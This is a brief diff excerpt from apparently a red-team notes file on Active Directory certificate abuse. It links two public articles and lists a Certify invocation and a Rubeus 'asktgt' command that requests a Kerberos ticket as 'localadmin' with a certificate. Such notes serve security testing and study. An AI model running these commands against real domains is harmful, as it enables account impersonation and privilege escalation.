@@ -686,4 +686,5 @@ https://blog.harmj0y.net/activedirectory/certified-pre-owned/
 https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d
 
 ```./certify.exe```
+
 ```./Rubeus.exe asktgt /user:localadmin /certificate:C:\Temp\hi.pfx /password:Password01```
